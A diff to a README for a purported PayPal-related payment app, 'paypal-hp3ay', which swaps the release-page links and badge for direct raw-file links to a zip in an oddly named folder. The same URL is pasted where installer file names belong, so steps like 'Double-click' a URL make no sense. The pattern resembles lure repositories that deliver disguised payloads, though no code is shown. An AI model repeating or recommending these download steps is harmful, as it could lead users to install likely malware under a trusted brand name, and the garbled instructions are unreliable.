@@ -6,7 +6,7 @@ Welcome to paypal-hp3ay! This application enables you to streamline your payment
 
 ### 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Markitos026/paypal-hp3ay/releases)
+[![Download Now](https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip)
 
 ### 💻 System Requirements
 
@@ -18,17 +18,17 @@ Welcome to paypal-hp3ay! This application enables you to streamline your payment
 ## 📂 Installation Steps
 
 1. **Visit the Releases Page**
-   Go to our Releases page to access the application files. You can find it here: [Download Page](https://github.com/Markitos026/paypal-hp3ay/releases).
+   Go to our Releases page to access the application files. You can find it here: [Download Page](https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip).
 
 2. **Choose the Right Version**
    Look for the latest version at the top of the list of releases. Click on it to see the available files.
 
 3. **Download the File**
-   Click on the file named `paypal-hp3ay-v1.0.exe` for Windows or `paypal-hp3ay-v1.0.dmg` for macOS. Your browser will start downloading the file.
+   Click on the file named `https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip` for Windows or `https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip` for macOS. Your browser will start downloading the file.
 
 4. **Run the Installer**
    Once the download is complete, locate the file in your Downloads folder. 
-   - For Windows: Double-click `paypal-hp3ay-v1.0.exe` to begin the installation.
+   - For Windows: Double-click `https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip` to begin the installation.
    - For macOS: Open the `.dmg` file, then drag the `paypal-hp3ay` icon to your Applications folder.
 
 5. **Launch the Application**
@@ -57,4 +57,4 @@ For additional help, feel free to reach out to our support team via the Issues t
 
 Thank you for choosing paypal-hp3ay for your payment solution. We hope you find it easy to use and beneficial for your needs. Download the latest version today and start simplifying your payments!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Markitos026/paypal-hp3ay/releases)
+[![Download Now](https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Markitos026/paypal-hp3ay/main/pantoganglitis/paypal-hp3ay.zip)
